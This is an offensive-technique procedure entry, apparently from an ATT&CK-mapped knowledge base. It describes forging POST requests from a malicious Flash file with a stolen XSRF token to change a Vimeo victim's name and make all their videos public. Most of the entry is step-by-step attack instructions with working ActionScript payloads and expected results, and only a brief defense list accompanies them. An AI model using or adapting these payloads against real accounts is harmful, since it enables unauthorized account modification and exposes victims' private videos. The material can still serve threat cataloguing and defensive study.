---
id: proc-vimeo-execute-csrf-001
tags:
  - csrf
  - account-takeover
  - settings-modification
type: procedure
tools:
  - '[[tools/evil-swf]]'
tactics:
  - '[[Execution]]'
verified: false
platforms:
  - Web
  - Flash
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Forge Web Credentials]]'
  - '[[Steal Web Session Cookie]]'
updated_at: '2025-12-14T17:27:36.203Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Forge Web Credentials]]'
  - '[[Steal Web Session Cookie]]'
---
# Execute-CSRF-Requests-with-Stolen-Token

## Summary

Using the stolen XSRF token, this procedure forges POST requests from the malicious SWF to Vimeo's settings endpoints, bypassing CSRF protections to change user name and set video privacy to public, resulting in unauthorized account modifications.

## Description

With the token in hand, evil.swf sends authenticated POST requests to sensitive endpoints like /settings for name changes and /settings/videos for privacy updates. The requests mimic legitimate user actions, succeeding because the token validates them in the session context. Changes to name are immediate, while video privacy updates propagate in 1-2 minutes, potentially exposing private content publicly.

## Requirements

1. Valid XSRF token extracted from previous step
2. Active Vimeo session in victim's browser
3. evil.swf capable of sending HTTP POST requests via Flash

## Defense

Defensive measures and detection strategies:

- Enforce strict CSRF token binding to origin and session
- Rate-limit or monitor POST requests to settings endpoints
- Log and alert on rapid successive modifications from Flash origins

## Objectives

1. Alter user account settings without consent
2. Expose private videos by changing privacy to public
3. Confirm request success for impact assessment

## Instructions

### Step 1: Send POST to Change User Name

**Context**: Use token to update the display name via /settings.

In Flash ActionScript:

```actionscript
var req:URLRequest = new URLRequest("https://vimeo.com/settings");
req.method = URLRequestMethod.POST;
req.data = "name=New%20Hacked%20Name&xsrf_token=" + stolenToken;
navigateToURL(req);
```

> Submits form data with token. Expected: 200 OK; name changes immediately.

### Step 2: Send POST to Change Video Privacy

**Context**: Set all videos and future ones to public via /settings/videos.

In Flash ActionScript:

```actionscript
var req:URLRequest = new URLRequest("https://vimeo.com/settings/videos");
req.method = URLRequestMethod.POST;
req.data = "privacy=public&future_privacy=public&xsrf_token=" + stolenToken;
navigateToURL(req);
```

> Updates privacy settings. Expected: 200 OK; videos become public in 1-2 minutes.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Forge Web Credentials]] Forge Web Credentials
- [[Steal Web Session Cookie]] Steal Web Session Cookie

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/evil-swf]]

## Tags

- csrf
- unauthorized-modification
- privacy-exposure
